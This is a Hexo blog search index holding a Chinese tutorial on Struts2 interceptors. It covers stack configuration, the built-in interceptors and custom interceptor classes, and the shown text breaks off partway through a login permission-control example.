<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Struts2之拦截器</title>
    <link href="/2021/04/25/Struts2%E6%8B%A6%E6%88%AA%E5%99%A8/"/>
    <url>/2021/04/25/Struts2%E6%8B%A6%E6%88%AA%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>摘要：Struts2框架学习笔记（三）</p> <a id="more"></a><h2 id="拦截器简介"><a href="#拦截器简介" class="headerlink" title="拦截器简介"></a>拦截器简介</h2><p>   拦截器（Interceptor）是Struts2的核心组成部分，它可以动态拦截Action调用的对象，类似于Servlet中的过滤器。 Struts2的拦截器是AOP（Aspect-Object-Programming，面向切面编程）的一种实现策略，是可插拔的。它可以任意地组合Action提供的附加功能，而不需要修改Action的代码，开发者只需要提供拦截器的实现类，并将其配置在struts.xml中即可。</p><p>每个拦截器可以完成单个功能。不同功能的拦截器按照一定的顺序排列在一起形成的链，就是拦截器链。拦截器链组成的集合就是拦截器栈。</p><h2 id="拦截器配置"><a href="#拦截器配置" class="headerlink" title="拦截器配置"></a>拦截器配置</h2><p><strong>1.拦截器</strong><br>要想拦截器起作用，首先要在struts.xml文件中进行配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span>  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;interceptorName&quot;</span>   <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;interceptorClass&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;paramName&quot;</span>&gt;</span>paramValue<span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">interceptor</span>&gt;</span><br></code></pre></td></tr></table></figure><p>name属性用来指定拦截器的名称，class属性用于指定拦截器的实现类。如果在定义拦截器时需要传入参数，这时需要使用<code>&lt;param&gt;</code>标签,其中name属性用来指定参数的名称，paramValue表示参数的值。</p><p><strong>2.拦截栈</strong><br>在实际开发中，经常需要在Action执行前同时执行多个拦截动作，如用户登录检查、登录日志记录以及权限检查等，这时，可以把多个拦截器组成一个拦截器栈。<br>在使用时，可以将栈内的多个拦截器当成个整体来引用。 当拦截器栈被附加到一个 Action上时，在执行Action之前必须先执行拦截器栈中的每一一 个拦截器。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">interceptors</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-stack</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;interceptorStackName&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span>  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;interceptorName&quot;</span> /&gt;</span><br>        ...<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-stack</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">interceptors</span>&gt;</span><br></code></pre></td></tr></table></figure><p>interceptorStackName值代表配置的拦截器栈的名称，interceptorName值代表拦截器的名称。</p><p>除此之外，一个拦截器栈也可以包含另外一个拦截器栈：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;xxx&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span> &gt;</span><br>    <span class="hljs-comment">&lt;!--声明拦截器--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">interceptors</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span>  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;interceptor1&quot;</span>   <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;interceptorClass&quot;</span>/&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span>  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;interceptor2&quot;</span>   <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;interceptorClass&quot;</span>/&gt;</span><br> <span class="hljs-comment">&lt;!--定义一个拦截器栈myStack，该拦截器栈中包含两个拦截器和一个拦截器栈--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-stack</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;myStack&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span>  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;defaultStack&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span>  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;interceptor1&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span>  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;interceptor2&quot;</span> /&gt;</span><br>     <span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-stack</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">interceptors</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在定义的拦截栈myStack中，除了引用了两个自定义的拦截器interceptor1和interceptor2外，还引用了一个内置拦截器栈defaultStack，且该内置拦截器栈必不可少。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;xxx&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span> &gt;</span><br>        <br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptors</span>&gt;</span><br>            <span class="hljs-comment">&lt;!--配置用户自定义的拦截器--&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;MyInterceptor&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;TestAction&quot;</span>/&gt;</span><br>            <br>            <span class="hljs-comment">&lt;!--自定义拦截器栈，我们配置了自定义的拦截器，默认的拦截器栈就不会被执行，因此，想要使用默认的拦截器功能，就要配置进来--&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-stack</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;mystack&quot;</span>&gt;</span><br>                <span class="hljs-comment">&lt;!--引用默认的拦截器栈，一定要放在第一行--&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;defalutStack&quot;</span>/&gt;</span><br>                <br>                <span class="hljs-comment">&lt;!--引用自定义的拦截器--&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;MyInterceptor&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-stack</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">interceptors</span>&gt;</span><br>        <br>        <span class="hljs-comment">&lt;!--上面配置了拦截器栈，但是没有被执行...下面配置执行拦截器--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">default-interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;mystack&quot;</span>/&gt;</span><br>        <br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;TestAction&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;TestAction&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;execute&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>/index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="内建拦截器"><a href="#内建拦截器" class="headerlink" title="内建拦截器"></a>内建拦截器</h2><p>拦截器都继承AbstractInterceptor</p><p>Struts2 框架中内置了许多拦截器，这些拦截器以 name-class 对的形式配置在 struts-default.xml 文件中，其中，name 是拦截器的名称，也就是引用的名字；class 指定了该拦截器所对应的实现。</p><p>只要自定义的包继承了 Struts2 的 struts-default 包，就可以使用包中定义的内建拦截器，否则需要自行定义拦截器。</p><p>内建拦截器介绍:<br>| 名称                | 说明                                                         |<br>| ——————- | ———————————————————— |<br>| alias               | 在不同请求之间将请求参数在不同名称间转换，请求内容不变       |<br>| autowiring          | 用于实现 Action 的自动装配                                   |<br>| chain               | 让前一个 Action 的属性可以被后一个 Action 访问，现在和 chain 类型的 result() 结合使用 |<br>| conversionError     | 将错误从 ActionContext 中添加到 Action 的属性字段中          |<br>| cookies             | 使用配置的 Name 和 Value 指定 Cookies                        |<br>| cookieProvider      | 该类是一个 Cookie 工具，方便开发者向客户端写 Cookie          |<br>| clearSession        | 用于清除一个 HttpSession 实例                                |<br>| createSession       | 自动创建 HttpSession，用于为需要使用                         |<br>| HttpSession         | 的拦截器服务                                                 |<br>| debugging           | 提供不同的调试用的页面展现内部的数据状况                     |<br>| execAndWait         | 在后台执行 Action，同时将用户带到一个中间的等待页面          |<br>| exception           | 将异常定位到一个画面                                         |<br>| fileUpload          | 提供文件上传功能                                             |<br>| il8n                | 记录用户选择的 locale                                        |<br>| logger              | 输出 Action 的名称                                           |<br>| model-driven        | 如果一个类实现了 Model Driven，将 get Model 得到的结果放在 Value Slack 中 |<br>| scoped-model-driven | 如果一个 Action 实现了                                       |<br>| params              | 将请求中的参数设置到 Action 中                               |<br>| actionMappingParams | 用于负责在 Action 配置中传递参数                             |<br>| prepare             | 如果 Action 实现了 Preparable，则该拦截器调用 Action 类的 prepare 方法 |<br>| staticParams        | 将 struts.xml 文件中 标签的参数内容设置到对应的 Action 中    |<br>| scope               | 将 Action 状态存入 session 和 application 范围               |<br>| servletConfig       | 提供访问 HttpServletRequest 和 HttpServletResponse 方法，以 Map 方式访问 |<br>| timer               | 输岀 Action 执行的时间                                       |<br>| token               | 通过 Token 避免双击                                          |<br>| tokenSession        | 和 Token Interceptor 一样，不过双击时把请求的数据存储在 Session 中 |<br>| validation          | 使用 action-validation.xml 文件中定义的内容校验提交的数据    |<br>| workflow            | 调用 Action 的 validate 方法，一旦有错谋返回，则重新定位到 INPUT 画面 |<br>| store               | 存储或者访问实现 ValidalionAware 接口的 Action 类出现的消息、错误和字段错误等 |<br>| checkbox            | 添加了 checkbox 自动处理代码，将没有选中的 checkbox 的内容设定为 false，而 html 在默认情况下不提交没有选中的 checkbox |<br>| datetime            | 日期拦截器                                                   |<br>| profiling           | 通过参数激活 profile                                         |<br>| roles               | 确定用户是否具有 JAAS 指定的 Role，否则不予执行              |<br>| annotationWorkflow  | 利用注解代替 XML 配置                                        |<br>| multiselect         | 检测是否有像 标签一样被选中的多个值，然后添加一个空参数      |<br>| deprecation         | 当日志级别设置为调试模式（debug）并且没有特殊参数时，在 devMode |</p><p>在 struts-core-2.3.24.jar 包中的根目录下找到 struts-default.xml 文件，打开后找到 元素下的内建拦截器和拦截器栈，其部分代码如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts-default&quot;</span> <span class="hljs-attr">abstract</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><br>    ...<br>    <span class="hljs-tag">&lt;<span class="hljs-name">interceptors</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--系统内建拦截器部分，上一部分介绍的内容--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;alias&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.opensymphony.xwork2.interceptor.AliasInterceptor&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;autowiring&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.opensymphony.xwork2.spring.interceptor.ActionAutowiringInterceptor&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;chain&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.opensymphony.xwork2.interceptor.ChainingInterceptor&quot;</span>/&gt;</span><br>        ...<br>        <span class="hljs-comment">&lt;!-- 定义Basic stack拦截器栈 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-stack</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;basicStack&quot;</span>&gt;</span><br>            <span class="hljs-comment">&lt;!--引用系统定义的exception拦截器--&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;exception&quot;</span>/&gt;</span><br>            ...<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-stack</span>&gt;</span><br>        ...<br>        <span class="hljs-comment">&lt;!-- 定义Sample model -driven stack --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-stack</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;modelDrivenStack&quot;</span>&gt;</span><br>            <span class="hljs-comment">&lt;!--引用系统定义的modelDriven拦截器--&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;modelDriven&quot;</span>/&gt;</span><br>            <span class="hljs-comment">&lt;!--引用系统定义的basicStack拦截器栈--&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;basicStack&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-stack</span>&gt;</span><br>        ...<br>        <span class="hljs-comment">&lt;!--定义defaultStack拦截器栈--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-stack</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;defaultStack&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;exception&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;alias&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;il8n&quot;</span>/&gt;</span><br>            ...<br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;validation&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;excludeMethods&quot;</span>&gt;</span>input,back,cancel,browse<span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-ref</span>&gt;</span><br>            ...<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-stack</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">interceptors</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--将defaulrStack拦截器栈配置为系统默认拦截器栈--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">default-interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;defaultStack&quot;</span>/&gt;</span><br>    <span class="hljs-comment">&lt;!--默认action类是ActionSupport--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">default-class-ref</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.opensymphony.xwork2.ActionSupport&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在上述内建拦截器的配置代码中，defaultStack 拦截器组合了多个拦截器，这些拦截器可以满足大部分 Web 应用程序的需求。使用时，只要在 struts.xml 定义包的过程中继承 struts-default 包，那么 defaultStack 拦截器栈就是默认拦截器的引用。</p><h2 id="自定义拦截器"><a href="#自定义拦截器" class="headerlink" title="自定义拦截器"></a>自定义拦截器</h2><p>   在实际的项目开发中，Struts2的内置拦截器可以完成大部分的拦截任务，但是，一些与系统逻辑相关的通用功能（如权限的控制、用户登录控制等），则需要通过自定义拦截器来实现，自定义拦截器其实就是开发自己的拦截器类。</p><p>自定义的拦截器类，需要实现import com.opensymphony.xwork2.interceptor.Interceptor接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Interceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Serializable</span> </span>&#123;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span></span>;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span>;<br> <br>    <span class="hljs-function">String <span class="hljs-title">intercept</span><span class="hljs-params">(ActionInvocation invocation)</span> <span class="hljs-keyword">throws</span> Exception</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>该接口提供了以下三个方法：</p><ul><li><p>void init():该方法在拦截器被创建后会立即被调用，它在拦截器的生命周期内只被调用一-次。可以在该方法中对相关资源进行必要的初始化。</p></li><li><p>void destroy():该方法与init()方法相对应，在拦截器实例被销毁之前,将调用该方法来释放与拦截器相关的资源。它在拦截器的生命周期内也只被调用一次。</p></li><li><p>String intercept( ActionInvocation invocation) throws Exception: 该方法是拦截器的核心方法,用来添加真正执行拦截工作的代码，实现具体的拦截操作。它返回一个字符串作为逻辑视图，系统根据返回的字符串跳转到对应的视图资源。每拦截一个动作请求，该方法就会被调用一次。该方法的ActionInvocation参数包含了被拦截的Action的引用,可以通过该参数的invoke()方法,将控制权转给下一个拦截器或者转给Action的execute()方法。</p></li></ul><p>如果需要自定义拦截器,只需要实现Interceptor接口的三个方法即可。然而在实际开发过程中,除了实现Interceptor接口可以自定义拦截器外,更常用的一种方式是继承抽象拦截器类AbstractIntercepter。</p><p>该类实现了Interceptor 接口，并且提供了init()方法 和destroy()方法的空实现。使用时，可以直接继承该抽象类，而不用实现那些不必要的方法”拦截器类AbstractInterceptor中定义的方法</p><p>如下所示:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AbstractInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Interceptor</span> </span>&#123;<br> <br>     <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span> </span>&#123;<br>       System.out.println(<span class="hljs-string">&quot;我是拦截器的初始化方法&quot;</span>);<br>    &#125;<br>   <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;<br>       System.out.println(<span class="hljs-string">&quot;我是拦截器的销毁方法&quot;</span>);<br>    &#125;<br> <br> <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> String <span class="hljs-title">intercept</span><span class="hljs-params">(ActionInvocation invocation)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>    System.out.println(<span class="hljs-string">&quot;我是拦截器的拦截方法&quot;</span>);<br>        <span class="hljs-comment">//调用invoke()方法，代表着放行执行下一个拦截器，如果没有拦截器了，那么就执行Action的业务代码</span><br>        <span class="hljs-comment">//可看成是过滤器的doFilter()方法</span><br>        actionInvocation.invoke();<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>AbstractInterceptor类实现了Interceptor接口的所有方法，只需继承AbstractInterceptor类，实现interceptor()方法就可以创建自定义拦截器。</p><h2 id="使用拦截器实现权限控制"><a href="#使用拦截器实现权限控制" class="headerlink" title="使用拦截器实现权限控制"></a>使用拦截器实现权限控制</h2><p>自定义一个拦截器需要三步：</p><ol><li>自定义一个实现Interceptor接口（或者继承自AbstractInterceptor）的类。</li><li>在strutx.xml中注册上一步中定义的拦截器。</li><li>在需要使用的Action中引用上述定义的拦截器，为了方便也可将拦截器定义为默认的拦截器，这样在不加特殊声明的情况下所有的Action都被这个拦截器拦截。</li></ol><p>源代码如下：</p><p>User.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.domain;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br><span class="hljs-keyword">private</span> String username; <span class="hljs-comment">//用户名</span><br><span class="hljs-keyword">private</span> String password; <span class="hljs-comment">//密码</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUsername</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> username;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br><span class="hljs-keyword">this</span>.username = username;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getPassword</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> password;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setPassword</span><span class="hljs-params">(String password)</span> </span>&#123;<br><span class="hljs-keyword">this</span>.password = password;<br>&#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User [username=&quot;</span> + username + <span class="hljs-string">&quot;, password=&quot;</span> + password + <span class="hljs-string">&quot;]&quot;</span>;<br>&#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>LoginAction.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><span class="hljs-keyword">import</span> cn.itcast.domain.User;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionContext;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ModelDriven;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ModelDriven</span>&lt;<span class="hljs-title">User</span>&gt; </span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = <span class="hljs-number">1L</span>;<br><span class="hljs-keyword">private</span> User user = <span class="hljs-keyword">new</span> User();<br><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">getModel</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> user;<br>&#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><span class="hljs-comment">//获取ActionContext</span><br>ActionContext actionContext = ActionContext.getContext();<br>System.out.println(user);<br><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;tom&quot;</span>.equals(user.getUsername())<br>&amp;&amp; <span class="hljs-string">&quot;123&quot;</span>.equals(user.getPassword())) &#123;<br><span class="hljs-comment">// 将用户存储在session中</span><br>actionContext.getSession().put(<span class="hljs-string">&quot;user&quot;</span>, user);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>actionContext.put(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;用户名或密码不正确&quot;</span>);<br><span class="hljs-keyword">return</span> INPUT;<br>&#125;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>BookAction.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span 